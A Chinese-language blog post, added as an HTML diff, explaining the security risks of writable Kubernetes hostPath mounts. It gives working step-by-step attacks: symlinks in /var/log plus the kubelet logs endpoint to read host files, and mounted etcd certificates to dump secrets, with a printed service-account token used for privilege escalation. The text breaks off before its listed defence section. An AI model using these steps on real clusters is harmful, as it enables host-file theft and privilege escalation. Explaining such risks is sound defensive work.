@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yizhi.ren","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="简介挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。 123456789101112volumes:- name: test-volume  hostPath:    path: &#x2F;data    type: Directory这时定义hostpath的volume，定义的时候没有readonly选项。volumeMounts:- name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="k8s中的hostPath的安全隐患">
+<meta property="og:url" content="https://yizhi.ren/2022/02/08/hostpath/index.html">
+<meta property="og:site_name" content="一支人">
+<meta property="og:description" content="简介挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。 123456789101112volumes:- name: test-volume  hostPath:    path: &#x2F;data    type: Directory这时定义hostpath的volume，定义的时候没有readonly选项。volumeMounts:- name">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-08T09:34:46.000Z">
+<meta property="article:modified_time" content="2022-02-08T09:34:46.000Z">
+<meta property="article:author" content="yizhiren">
+<meta property="article:tag" content="kubernetes">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://yizhi.ren/2022/02/08/hostpath/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://yizhi.ren/2022/02/08/hostpath/","path":"2022/02/08/hostpath/","title":"k8s中的hostPath的安全隐患"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>k8s中的hostPath的安全隐患 | 一支人</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69495409-1"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-69495409-1","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?3aa0f62e48c3501c66bc10dbe7a49356"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">一支人</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">碎碎念</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+        <li class="menu-item menu-item-commonweal"><a href="/404.html" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">2.</span> <span class="nav-text">主机文件泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9B%86%E7%BE%A4%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="nav-number">3.</span> <span class="nav-text">集群数据泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">其他方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">5.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yizhiren"
+      src="https://avatars0.githubusercontent.com/u/15405596">
+  <p class="site-author-name" itemprop="name">yizhiren</p>
+  <div class="site-description" itemprop="description">promise.get_future();</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://yizhi.ren/2022/02/08/hostpath/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/15405596">
+      <meta itemprop="name" content="yizhiren">
+      <meta itemprop="description" content="promise.get_future();">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一支人">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          k8s中的hostPath的安全隐患
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-08 17:34:46" itemprop="dateCreated datePublished" datetime="2022-02-08T17:34:46+08:00">2022-02-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%9E%B6%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">架构</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">volumes:</span><br><span class="line">- name: test-volume</span><br><span class="line">  hostPath:</span><br><span class="line">    path: /data</span><br><span class="line">    type: Directory</span><br><span class="line">这时定义hostpath的volume，定义的时候没有readonly选项。</span><br><span class="line"></span><br><span class="line">volumeMounts:</span><br><span class="line">- name: test-volume</span><br><span class="line">  mountPath: /test-volume</span><br><span class="line">  readOnly: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在官方文档中有这么一段话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://kubernetes.io/docs/concepts/storage/volumes/#hostpath</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">HostPath volumes present many security risks, and it is a best practice to avoid the use of HostPaths when possible. When a HostPath volume must be used, it should be scoped to only the required file or directory, and mounted as ReadOnly.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>简单讲就是在强调你在挂载hostpath的volume的时候必须设置readOnly，且必须约束可以挂载的目录。</p>
+<p>设置readOnly是因为，已经证明存在一些方法来绕过约束。比如我配置了hostPath不能访问A目录，但是我可以通过挂载B目录间接访问A目录；或者我配置了hostPath只能访问A目录，但是我可以通过A目录，间接访问到B目录。是不是很神奇。</p>
+<p>下面演示两个例子，来说明不设置readOnly和不约束可挂载目录所带来的隐患。</p>
+<span id="more"></span>
+
+<h2 id="主机文件泄露"><a href="#主机文件泄露" class="headerlink" title="主机文件泄露"></a>主机文件泄露</h2><p>这个例子通过挂载一个特定的可写目录，来实现读取系统任何文件的目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 首先创建一个pod挂载系统的/var/log目录</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: null</span><br><span class="line">  labels:</span><br><span class="line">    run: busy</span><br><span class="line">  name: busy</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: busybox</span><br><span class="line">    name: busy</span><br><span class="line">    resources: &#123;&#125;</span><br><span class="line">    args:</span><br><span class="line">    - sh</span><br><span class="line">    - -c</span><br><span class="line">    - &quot;sleep 1d&quot;</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: varlog</span><br><span class="line">      mountPath: /var/log</span><br><span class="line">      # readOnly: true</span><br><span class="line">  dnsPolicy: ClusterFirst</span><br><span class="line">  restartPolicy: Always</span><br><span class="line">  volumes:</span><br><span class="line">  - name: varlog</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /var/log</span><br><span class="line">      type: Directory</span><br><span class="line">status: &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~$ kl apply -f busy.yaml --force</span><br><span class="line">pod/busy created</span><br></pre></td></tr></table></figure>
+
+<p>然后我们进到pod中查看该目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~$ kl exec busy -it -- sh</span><br><span class="line">/ # cd /var/log</span><br><span class="line">/var/log # ls</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>显然我们是可以看到这个目录下的所有文件的，但是这个时候如果告诉你/var/log目录目前可写，然后希望借助这个目录读取到系统中的任何文件，然后你能想到方案吗，我想不是专业安全人员是不能想到这个方法的。</p>
+<p>这个方法就是通过建立软连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log # ln -s /etc/passwd passwd.log</span><br><span class="line"></span><br><span class="line">/var/log # cat passwd.log </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试读passwd但是显然读到的是容器内的passwd，我们想要读到的是主机上的passwd。那怎么办呢？</p>
+<p>关键的时候到了，我们先给当前用户配置一个读log的权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 给当前sa配置日志相关的权限</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRole</span><br><span class="line">metadata:</span><br><span class="line">  name: getlog</span><br><span class="line">rules:</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - nodes/log</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">---</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: null</span><br><span class="line">  name: getlog</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: getlog</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: default</span><br><span class="line">  namespace: default</span><br><span class="line"># 经过测试用rolebinding不行，得用clusterrolebinding  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">~$ kl apply -f roleset.yaml</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/getlog configured</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/getlog configured</span><br></pre></td></tr></table></figure>
+
+<p>然后通过curl发起连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 拿到sa的TOKEN</span><br><span class="line">~$ kl get secret</span><br><span class="line">NAME                          TYPE                                  DATA   AGE</span><br><span class="line">...</span><br><span class="line">default-token-5kd6c           kubernetes.io/service-account-token   3      18d</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">~$ TOKEN=$(kl get secret -n default default-token-5kd6c -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class="line"></span><br><span class="line"># 拿到pod所在主机ip</span><br><span class="line">~$ HOST=$(kl get pod busy -o jsonpath=&#x27;&#123;.status.hostIP&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 读取日志,指定passwd.log，我们刚才在容器中创建的软连接</span><br><span class="line">~$ curl -k  https://$HOST:10250/logs/passwd.log --header &quot;Authorization: Bearer $TOKEN&quot;</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>神奇的事情发生了，我们读取到了主机中的文件。原理是当我们通过curl访问kubelet时，kubelet会去读取容器中创建的软连接，并解析到主机上的文件中去，从而导致主机的文件内容泄露。</p>
+<p>我们还可以更进一步，直接在pod内就可以去读主机的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 先进到pod中</span><br><span class="line">~$ kl exec busy -it -- sh</span><br><span class="line">/ # </span><br><span class="line"></span><br><span class="line"># 然后创建脚本</span><br><span class="line">/ # vi readfile.sh </span><br><span class="line">ln -s -f / /var/log/hostroot</span><br><span class="line"></span><br><span class="line">HOST=$(route | grep default | awk -F&#x27; &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">wget -qO- --header &quot;Authorization: Bearer $TOKEN&quot; https://$HOST:10250/logs/hostroot$1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 然后就可以读文件以及列目录了</span><br><span class="line">/ # sh readfile.sh /etc/passwd</span><br><span class="line">wget: note: TLS certificate validation not implemented</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ # sh readfile.sh /tmp/</span><br><span class="line">wget: note: TLS certificate validation not implemented</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;a href=&quot;.ICE-unix/&quot;&gt;.ICE-unix/&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;.Test-unix/&quot;&gt;.Test-unix/&lt;/a&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h2 id="集群数据泄露"><a href="#集群数据泄露" class="headerlink" title="集群数据泄露"></a>集群数据泄露</h2><p>再来看另一种利用方法, 这种方法是用hostPath挂载/etc/kubernetes/pki/etcd，然后连接etcd读取数据。</p>
+<p>etcd中存了集群的所有数据，所以能读到token，从而导致低权限用户权限提升，带来隐患。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 这里需要hostPath和hostNetwork:true和nodeName:server1配合使用</span><br><span class="line">~$ vi etcdctl.yaml </span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: null</span><br><span class="line">  labels:</span><br><span class="line">    run: etcdctl</span><br><span class="line">  name: etcdctl</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: anonoz/etcdctl-arm64</span><br><span class="line">    name: etcdctl</span><br><span class="line">    command:</span><br><span class="line">    - sleep</span><br><span class="line">    - 1d</span><br><span class="line">    env:</span><br><span class="line">    - name: ETCDCTL_API</span><br><span class="line">      value: &quot;3&quot;</span><br><span class="line">    resources: &#123;&#125;</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /etc/kubernetes/pki/etcd</span><br><span class="line">      name: etcd-certs</span><br><span class="line">  nodeName: server1</span><br><span class="line">  dnsPolicy: ClusterFirst</span><br><span class="line">  restartPolicy: Always</span><br><span class="line">  hostNetwork: true</span><br><span class="line">  volumes:</span><br><span class="line">  - name: etcd-certs</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /etc/kubernetes/pki/etcd</span><br><span class="line">      type: Directory</span><br><span class="line">status: &#123;&#125;</span><br><span class="line"></span><br><span class="line">~$ kl apply -f etcdctl.yaml </span><br></pre></td></tr></table></figure>
+
+<p>随后连到pod中读取secret数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">~$ kl exec etcdctl -it -- sh</span><br><span class="line">/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc</span><br><span class="line">/kubernetes/pki/etcd/ca.crt get &#x27;&#x27; --from-key --keys-only | grep secret</span><br><span class="line">...</span><br><span class="line">/registry/secrets/kube-system/job-controller-token-klrfg</span><br><span class="line">/registry/secrets/kube-system/kube-proxy-token-md447</span><br><span class="line">/registry/secrets/kube-system/metrics-server-token-vmnrm</span><br><span class="line">/registry/secrets/kube-system/namespace-controller-token-nmvqq</span><br><span class="line">/registry/secrets/kube-system/node-controller-token-6rlxz</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># 我们随便拿一个secret中的token值来用</span><br><span class="line"># 这个命令会返回一段格式有点乱的内容，但是能清晰的分辨出token的内容。</span><br><span class="line">/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc</span><br><span class="line">/kubernetes/pki/etcd/ca.crt get /registry/secrets/kube-system/node-controller-token-6rlxz</span><br><span class="line">...</span><br><span class="line">token?eyJhbGciOiJSUzI1NiIsImtpZCI6InpXaFVvaWdSU19Pbmo5dnUtOGFTWVQ1bjIzYkptWmFpX2Q1VFBuT2EtZTAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJub2RlLWNvbnRyb2xsZXItdG9rZW4tNnJseHoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoibm9kZS1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNDU4MDljM2QtNTNiNS00ZWI5LTk1MTAtNjExOGZmZjY4ZDk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOm5vZGUtY29udHJvbGxlciJ9.N8QgQCjv22oE22ct--ib-2A74GaLPkQ6ka1xDysphhljeItSSat1gQRtBawgoF-vuj1a55pdLLPDva9L7sQzG-EaFVUaFBenDeJgOF-vM1LzIqAEmIw4K4IlHKPQNRXi678cJ7mR-R-Iufj9dpOl5zKMS7p_4RydXr8EhfaxgBwqYJkOdQNWIcfPhYM1xiVIplIFKs61Vf0sU1NnSeXJy3WTUqimn_i-d_E5TUMp9_hlIn6iHR4U5UwkGboxFBtfhc0KDn24ShbshpTaM6d6LKJQzrTwTmBwMK2pw0rEfJTKK_Q-3xHlEfF3bj2rcOtrQNylOAVtvggX_elqwXlelQ#kubernetes.io/service-account-token&quot;</span><br><span class="line"></span><br><span class="line"># 离开pod</span><br><span class="line"># 设置token到kubeconfig中并查看这个token的全部权限</span><br><span class="line">~$ kl config set-credentials tokenfrometcd --token xxx</span><br><span class="line">User &quot;tokenfrometcd&quot; set.</span><br><span class="line">~$ kl config set-context tokenfrometcd --cluster kubernetes --user tokenfrometcd</span><br><span class="line">Context &quot;tokenfrometcd&quot; created.</span><br><span class="line">~$ kl --context=tokenfrometcd auth can-i --list</span><br><span class="line">Resources                                       Non-Resource URLs                     Resource Names          Verbs</span><br><span class="line">events                                          []                                    []                      [create patch update]</span><br><span class="line">events.events.k8s.io                            []                                    []                      [create patch 